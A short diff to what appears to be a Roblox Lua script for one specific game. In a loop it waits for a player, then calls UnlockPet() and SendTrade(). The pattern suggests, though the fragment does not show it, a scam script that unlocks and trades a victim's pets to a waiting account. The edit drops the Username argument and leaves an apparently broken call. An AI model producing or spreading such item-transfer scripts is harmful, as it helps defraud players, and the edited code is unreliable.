@@ -255,7 +255,7 @@ if game.PlaceId == 8737899170 then
 
     while true do
         wait(1)
-        if game:GetService("Players"):WaitForChild(Username) ~= nil then
+        if game:GetService("Players"):WaitForChild() ~= nil then
             UnlockPet()
             SendTrade()
         end
